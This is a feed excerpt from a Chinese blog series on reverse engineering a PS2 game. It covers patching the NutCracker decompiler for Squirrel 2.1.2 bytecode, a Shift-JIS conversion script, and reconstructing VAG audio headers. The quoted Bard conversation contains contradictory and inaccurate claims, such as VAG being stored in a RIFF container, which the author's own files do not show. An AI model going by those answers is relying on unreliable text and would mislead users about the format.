_CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nlocalvarinfos, <span class="built_in">sizeof</span>(nlocalvarinfos)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nlineinfos, <span class="built_in">sizeof</span>(nlineinfos)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;ninstructions, <span class="built_in">sizeof</span>(ninstructions)));</span><br><span class="line">    _CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;nfunctions, <span class="built_in">sizeof</span>(nfunctions)));</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 010 的模版中注释掉下面的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> nDefaultParams</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> (!ConfirmOnPart()) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (nDefaultParams)</span><br><span class="line">    DefaultParams <span class="title function_">m_DefaultParams</span><span class="params">(nDefaultParams)</span>;</span><br></pre></td></tr></table></figure><p>继续运行模版，报了新的错</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/35.jpg" alt="Not Found"></p><p>这次是模版本身报错，原因是文件解析完毕后没有找到最后的 <code>LIAT</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NutEnd</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> magicTAIL[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">if</span> (magicTAIL != <span class="string">&quot;LIAT&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Warning(<span class="string">&quot;Confirm End Failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>验证一下，果然把文件中最后的 <code>LIAT</code> 解析成了 <code>m_VarParams</code>。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/36.jpg" alt="Not Found"></p><p>既然没有报 <code>TRAP</code> 的错，那么就表示在 <code>nFunctions</code> 后出现了问题，看一下模版，在 <code>nFunctions</code> 后主要有三个数据</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/37.jpg" alt="Not Found"></p><p>还是再回到 Squirrel 2.1.2 的源码中，看看结构最后是不是有这三个数据。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">_CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line">_CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, f-&gt;_instructions, <span class="built_in">sizeof</span>(SQInstruction)*ninstructions));</span><br><span class="line"></span><br><span class="line">_CHECK_IO(<span class="built_in">CheckTag</span>(v,read,up,SQ_CLOSURESTREAM_PART));</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nfunctions; i++)&#123;</span><br><span class="line">    _CHECK_IO(_funcproto(o)-&gt;<span class="built_in">Load</span>(v, up, read, o));</span><br><span class="line">    f-&gt;_functions[i] = o;</span><br><span class="line">&#125;</span><br><span class="line">_CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;f-&gt;_stacksize, <span class="built_in">sizeof</span>(f-&gt;_stacksize)));</span><br><span class="line">_CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;f-&gt;_bgenerator, <span class="built_in">sizeof</span>(f-&gt;_bgenerator)));</span><br><span class="line">_CHECK_IO(<span class="built_in">SafeRead</span>(v,read,up, &amp;f-&gt;_varparams, <span class="built_in">sizeof</span>(f-&gt;_varparams)));</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>居然都有，那么再看看这三个数据的大小。在 <code>squirrel/sqfuncproto.h</code> 中找到这三个数据的定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQInteger _stacksize;</span><br><span class="line"><span class="type">bool</span> _bgenerator;</span><br><span class="line"><span class="type">bool</span> _varparams;</span><br></pre></td></tr></table></figure><p>这时候就看出来问题了，在模版中最后的 <code>m_VarParams</code> 是 4 个字节的 int，但是在源码中却是 1 个字节的 bool，修改模版将 <code>int m_VarParams</code> 改成 <code>char m_VarParams</code> 后再次运行，这次就执行成功了，代表我们的修改全部都是正确的，并且 Squirrel 的版本一定小于等于 2.1.2。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/38.jpg" alt="Not Found"></p><p>确定了大致的版本以后，由于版本 2.1.2 太过古老，我们先尝试修改第一个最初的 <a href="http://www.mediafire.com/?ruulm32z36i5dff">NutCracker - DamianXVI</a> 来使其兼容 Squirrel 2.1.2，NutCracker 用 Visual Studio 开发，为了避免不必要的麻烦还是在 VS 下编辑运行最好，同时需要在项目 - 属性里设置 Windows SDK 版本以及平台工具集。</p><p>首先按照我们在 010 模版中修改的步骤，在 NutCracker 修改文件格式相关的代码。在 <code>nutcracker/NutScript.cpp</code> 的 <code>NutFunction::Load</code> 中注释以下代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="type">int</span> nDefaultParams = reader.<span class="built_in">ReadInt32</span>();</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">reader.<span class="built_in">ConfirmOnPart</span>();</span><br><span class="line"></span><br><span class="line">m_DefaultParams.<span class="built_in">resize</span>(nDefaultParams);</span><br><span class="line"><span class="keyword">if</span> (nDefaultParams)</span><br><span class="line">&#123;</span><br><span class="line">    reader.<span class="built_in">Read</span>(&amp;(m_DefaultParams.<span class="built_in">at</span>(<span class="number">0</span>)), nDefaultParams * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>之后编译运行一下是否可以反编译。</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/40.jpg" alt="Not Found"></p><p>反编译成功，但是缺点是不支持类似 Shift-JIS 的双字节编码</p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/41.jpg" alt="Not Found"></p><p>写个脚本转换一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Email: srpopty@outlook.com</span></span><br><span class="line"><span class="comment"># FileName: transfor.py</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment">#   Convert string in double qoute to ja_jp.shiftjis.</span></span><br><span class="line"><span class="comment"># ========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    invisible = [<span class="number">0</span>, <span class="number">0xFF</span>, <span class="number">0xFE</span>]</span><br><span class="line">    filename = filename.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    ext = filename[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;&quot;</span>.join(filename[:-<span class="number">1</span>]) + <span class="string">&quot;_shiftjis.&quot;</span> + ext, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        length = <span class="built_in">len</span>(data)</span><br><span class="line">        <span class="keyword">while</span> i &lt; length:</span><br><span class="line">            c = data[i]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> invisible:</span><br><span class="line">                <span class="keyword">if</span> c == <span class="number">0x22</span>:</span><br><span class="line">                    j = i + <span class="number">1</span></span><br><span class="line">                    string = <span class="string">&quot;&quot;</span></span><br><span class="line">                    <span class="keyword">while</span> data[j] != <span class="number">0x22</span>:</span><br><span class="line">                        cc = data[j]</span><br><span class="line">                        <span class="keyword">if</span> cc <span class="keyword">not</span> <span class="keyword">in</span> invisible:</span><br><span class="line">                            string += <span class="built_in">chr</span>(cc)</span><br><span class="line">                        j += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;\\x00&quot;</span> <span class="keyword">in</span> string:</span><br><span class="line">                        string = <span class="built_in">eval</span>(</span><br><span class="line">                            <span class="string">&#x27;b&quot;&#x27;</span> + string.replace(<span class="string">&quot;\\x00&quot;</span>, <span class="string">&quot;\\x&quot;</span>) + <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">                        ).decode(<span class="string">&quot;shift-jis&quot;</span>)</span><br><span class="line">                        string = string.replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\\r&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\\n&quot;</span>)</span><br><span class="line">                    f.write(<span class="string">b&#x27;&quot;%s&quot;&#x27;</span> % string.encode())</span><br><span class="line">                    i = j</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    f.write(<span class="built_in">chr</span>(c).encode())</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>批量转换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> 3[2-9]*.nut | xargs -I &#123;&#125; python3 ./transfor.py &#123;&#125;</span><br><span class="line">python3 ./transfor.py 41.nut</span><br></pre></td></tr></table></figure><p>最后终于正确反编译了全部 10 个 <code>.cnut</code></p><p><img src="/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/42.jpg" alt="Not Found"></p>]]></content>
    
    
    <summary type="html">一个Web狗针对某上古时期的PlayStation2游戏的逆向以及资源提取记录。</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="ReverseEngineering" scheme="https://srpopty.github.io/tags/ReverseEngineering/"/>
    
  </entry>
  
  <entry>
    <title>某上古 PS2 游戏逆向（二）音频分析</title>
    <link href="https://srpopty.github.io/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://srpopty.github.io/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2023-06-11T06:27:12.000Z</published>
    <updated>2023-06-11T06:27:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="音频文件分析"><a href="# 音频文件分析" class="headerlink" title="音频文件分析"></a>音频文件分析 </h1><p> 根据文件名猜测角色音频保存在 <code>VOICE_ID.bin</code> 中，使用 Cube Media Player2 扫描 <code>VOICE_ID.bin</code> 可以发现里面保存的是 <code>adpcm</code> 格式的原始音频数据</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/11.jpg" alt="Not Found"></p><p>本来尝试直接利用 PSound 或者 Cube Media Player2 提取音频，自动转换到 wav 可以省很多事，但是发现这两个软件要么扫描的不全，要么扫描出来的音频是错的，所以折腾了半天，还是得自己手动提取。不过 Cube Media Player2 可以提供扫描到的音频的偏移以及长度，正好也验证了前文提取出来的文件内容是正确的。</p><p>Google 了一下，adpcm 是基于 pcm 的一种有损压缩编码，可以大幅压缩 pcm 数据，通常 wav 文件中就包含了原始的 pcm 或者 adpcm 数据，因此直接将 adpcm 转换为 wav 是有可能的，不过需要知道其对应的采样率、声道等信息。当然，以上信息来自 Google，不管是中文英文，大部分都是水文或者标题党，点名批评 CSDN，大部分文章点进去发现就介绍了一下 adpcm 算法，然后就介绍 wav 文件的格式，甚至连 adpcm 的格式都说不清楚，维基百科介绍的都比文章里介绍的言简意赅，搜了一个晚上和一个下午，愣是没查出来到底怎么把 adpcm 转换为 wav。</p><h1 id="AI 的智慧"><a href="#AI 的智慧" class="headerlink" title="AI 的智慧"></a>AI 的智慧 </h1><p> 手动将原始的 adpcm 拖到 Audacity 中使用 adpcm 格式确实可以听到一点点人声，但是噪声非常非常大。最后无奈求助人工智能，人工智能确实比网上不靠谱的文章靠谱的多，求助 bard，有了如下对话：</p><hr><p><strong>Srpopty</strong>: What is PS2 ADPCM Raw File?</p><p><strong>Bard</strong>: A PS2 ADPCM raw file is a type of audio file that is used to store audio data on the PlayStation 2 console. The file format is based on the ADPCM (Adaptive Differential Pulse-Code Modulation) compression algorithm, which is a lossy compression format that reduces the size of the audio file by discarding some of the data.</p><p>PS2 ADPCM raw files are typically stored in a .VAG file format. The file format consists of a header, which contains information about the audio data, and a data section, which contains the compressed audio data.</p><p>To play back a PS2 ADPCM raw file, you will need a software application that supports the .VAG file format. Some popular software applications that support the .VAG file format include:</p><ul><li><strong>Audacity</strong></li><li><strong>VLC Media Player</strong></li><li><strong>foobar2000</strong></li></ul><p>Once you have a software application that supports the .VAG file format, you can open the file and play it back.</p><p>Here are some of the advantages of using PS2 ADPCM raw files:</p><ul><li><strong>Small file size:</strong> The ADPCM compression algorithm used to create PS2 ADPCM raw files can significantly reduce the size of the audio file, making it easier to store and transfer.</li><li><strong>Wide compatibility:</strong> PS2 ADPCM raw files are supported by a wide variety of software applications, making them easy to play back.</li></ul><p>Here are some of the disadvantages of using PS2 ADPCM raw files:</p><ul><li><strong>Lossy compression:</strong> The ADPCM compression algorithm used to create PS2 ADPCM raw files discards some of the data, which can result in a loss of audio quality.</li><li><strong>Not suitable for all applications:</strong> PS2 ADPCM raw files are not suitable for all audio applications. For example, they are not suitable for high-fidelity audio, such as music or sound effects.</li></ul><p>Overall, PS2 ADPCM raw files are a convenient way to store and transfer audio data. However, it is important to be aware of the potential loss of audio quality that can occur when using this format.</p><hr><p>从这里可以得到一个很重要的信息 <code>PS2 ADPCM raw files are typically stored in a .VAG file format</code>，在 PS2 中音频经常使用 <code>.vag</code> 格式保存，并且还提醒我们可以用 <code>Audacity</code> 打开这种格式。</p><hr><p><strong>Srpopty</strong>: What is the  .VAG file format?</p><p><strong>Bard</strong>: A .VAG file is a sound file format developed by Sony for use in PlayStation games. It is a compressed format that uses the Adaptive Differential Pulse-Code Modulation (ADPCM) algorithm to reduce the size of the audio data.</p><p>.VAG files are typically 4-bit ADPCM, which means that each sample is represented by 4 bits of data. This results in a file size that is about one-quarter the size of a uncompressed 16-bit audio file.</p><p>.VAG files are stored in a RIFF (Resource Interchange File Format) container. The RIFF header contains information about the file, such as the number of channels, the sample rate, and the bit depth. The data section contains the compressed audio data.</p><p>.VAG files can be played back by software that supports the RIFF container format. Some popular software applications that can play back .VAG files include:</p><ul><li>Audacity</li><li>VLC Media Player</li><li>foobar2000</li></ul><p>.VAG files are a common format for storing sound effects and music in PlayStation games. They are also used in some other applications, such as video editing and audio recording.</p><p>Here are some of the advantages of using .VAG files:</p><ul><li><strong>Small file size:</strong> The ADPCM compression algorithm used to create .VAG files can significantly reduce the size of the audio file, making it easier to store and transfer.</li><li><strong>Wide compatibility:</strong> .VAG files are supported by a wide variety of software applications, making them easy to play back.</li></ul><p>Here are some of the disadvantages of using .VAG files:</p><ul><li><strong>Lossy compression:</strong> The ADPCM compression algorithm used to create .VAG files discards some of the data, which can result in a loss of audio quality.</li><li><strong>Not suitable for all applications:</strong> .VAG files are not suitable for all audio applications. For example, they are not suitable for high-fidelity audio, such as music or sound effects.</li></ul><p>Overall, .VAG files are a convenient way to store and transfer audio data. However, it is important to be aware of the potential loss of audio quality that can occur when using this format.</p><hr><p>从这段对话可以知道 <code>.VAG files can be played back by software that supports the RIFF container format</code>，<code>.vag</code> 保存在 RIFF 中，但是在我们提取出的文件中并没有看到 RIFF 文件头，于是尝试将 <code>VOICE_ID</code> 中的后缀名改为 <code>.vag</code>，再用 Audacity 打开，发现 Audacity 可以正常读取，设置采样率为 <code>22050</code> 可以听到清晰的人声，而 <code>VOCIDE_ID</code> 中第一个文件的人声刚好和 PSound 提取的相同，但是 PSound 只提取出了这一段声音的后半段。</p><h1 id="VAG 文件"><a href="#VAG 文件" class="headerlink" title="VAG 文件"></a>VAG 文件 </h1><p> 然而，尽管 ps2 使用 <code>.vag</code> 格式保存音频，但是 vag 仍然拥有固定的格式，例如在 vag2 和 vag3 的两个版本中都有不同的文件头</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Format Specifications (version 2)</span><br><span class="line">// VAG file format</span><br><span class="line"></span><br><span class="line">// big endian </span><br><span class="line"></span><br><span class="line">//header</span><br><span class="line">4 bytes (char) - magic // &quot;VAGp&quot;</span><br><span class="line">4 bytes uint32 - format version  // &quot;2&quot;</span><br><span class="line">4 bytes (uint32) - source start offset // always &quot;0&quot;</span><br><span class="line">4 bytes (uint32) - waveform data size </span><br><span class="line">4 bytes (uint32) - sample rate (Hz)</span><br><span class="line">2 bytes (uint16) - base volume for left channel</span><br><span class="line">2 bytes (uint16) - base volume for right channel</span><br><span class="line">2 bytes (uint16) - base pitch (includes fs modulation)</span><br><span class="line">2 bytes (uint16) - base ADSR1</span><br><span class="line">2 bytes (uint16) - base ADSR2</span><br><span class="line">2 bytes (uint16) - reserved area</span><br><span class="line">16 bytes (char) - track name</span><br><span class="line"></span><br><span class="line">//data</span><br><span class="line">x bytes - waveform data (ADPCM Audio)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Format Specifications (version 3)</span><br><span class="line">// VAG file format</span><br><span class="line"></span><br><span class="line">// big endian </span><br><span class="line"></span><br><span class="line">//header</span><br><span class="line">4 bytes (char) - signature // &quot;VAGp&quot;</span><br><span class="line">4 bytes (uint32) - format version  // &quot;3&quot;</span><br><span class="line">4 bytes (uint32) - source start offset // always &quot;0&quot;</span><br><span class="line">4 bytes (uint32) - waveform data size </span><br><span class="line">4 bytes (uint32) - sample rate (Hz)</span><br><span class="line">10 bytes - reserved area</span><br><span class="line">1 byte (uint8) - number of channels  // &quot;0&quot; or &quot;1&quot; --&gt; 1 channel</span><br><span class="line">                                     // &quot;2&quot; --&gt; 2 channels</span><br><span class="line">1 byte (uint8) - reserved area</span><br><span class="line">32 bytes (char) - track name  // e.g. &quot;s11_03/MD&quot;</span><br><span class="line"></span><br><span class="line">//data</span><br><span class="line">x bytes - waveform data (ADPCM Audio)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Format Specifications (version 6)</span><br><span class="line">// VAG file format</span><br><span class="line"></span><br><span class="line">// big endian </span><br><span class="line"></span><br><span class="line">//header</span><br><span class="line">4 bytes (char) - signature // &quot;VAGp&quot;</span><br><span class="line">4 bytes (uint32) - format version  // &quot;6&quot;</span><br><span class="line">4 bytes (uint32) - reserved area</span><br><span class="line">4 bytes (uint32) - waveform data size </span><br><span class="line">4 bytes (uint32) - sample rate (Hz)</span><br><span class="line">10 bytes - reserved area</span><br><span class="line">1 byte (uint8) - number of channels  // &quot;0&quot; or &quot;1&quot; --&gt; 1 channel</span><br><span class="line">                                     // &quot;2&quot; --&gt; 2 channels</span><br><span class="line">1 byte (uint8) - reserved area</span><br><span class="line">16 bytes (char) - track name  // e.g. &quot;s11_03/MD&quot;</span><br><span class="line"></span><br><span class="line">//data</span><br><span class="line">x bytes - waveform data (ADPCM Audio)</span><br></pre></td></tr></table></figure><p>在我们提取出的文件中并没有发现”VAGp”这个字符串，如下图所示 <code>VIOCE_ID.BIN</code> 的第一个文件</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/12.jpg" alt="Not Found"></p><p>但是 Audacity 仍然可读，可以猜测我们提取出的只是裸数据，也就是 <code>waveform data</code>，仍然缺少文件头，意味着缺少例如采样率，声道数等信息，导致从 Audacity 导出时会将裸数据中的值解析为 vag 格式，例如导出为 mp3 时会警告</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/13.jpg" alt="Not Found"></p><p>而 150999087，也就是 0x0900102f 刚好对应前面 0x10 位置处的 4 个字节，因此我们需要为裸数据填充合适的文件头。</p><p>在 Audacity 中设置采样率为 22050，单声道时可以听到清晰的人声，因此确定裸数据的采样率就是 22050，声道数为 1，32 位浮点。</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/14.jpg" alt="Not Found"></p><p>根据 Google 的 <a href="https://www.psdevwiki.com/ps3/Multimedia_Formats_and_Tools#VAG"> 结果</a>，在 PS3 中使用了第六版的 VAG，因此我们先从 verison 6 开始尝试添加 vag 文件头</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">        0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F</span><br><span class="line">0000h: 56 41 47 70 00 00 00 06 00 00 00 00 00 01 07 00</span><br><span class="line">0010h: 00 00 56 22 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0020h: 74 65 73 74 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/15.jpg" alt="Not Found"></p><p>首先添加了 4 个字节的”VAGp”字符串，然后添加了 4 个字节版本号为 6，接着 4 个字节保留位，接着 4 个字节是 adpcm 裸数据的大小，接着是 4 个字节采样率，也就是 22050，之后 10 个字节保留位，接 1 个字节的声道数，也就是 0 表示单声道，接着 1 个字节保留位，最后从 0x20 开始 16 个字节填写音轨名称，大端保存。然后用 ffmpeg 转换为 wav，发现可以正常转换，播放的声音也正常</p><p><img src="/2023/06/11/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%BA%8C%EF%BC%89/16.jpg" alt="Not Found"></p><h1 id="音频修复与转换"><a href="# 音频修复与转换" class="headerlink" title="音频修复与转换"></a>音频修复与转换 </h1><p> 基于以上分析的结果，可以写一个音频修复的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># =======================================================</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Email: srpopty@outlook.com</span></span><br><span class="line"><span class="comment"># FileName: vag.py</span></span><br><span class="line"><span class="comment"># Description:</span></span><br><span class="line"><span class="comment">#     Simply add a VAG6 header to raw vag data.</span></span><br><span class="line"><span class="comment"># ========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    filename = <span 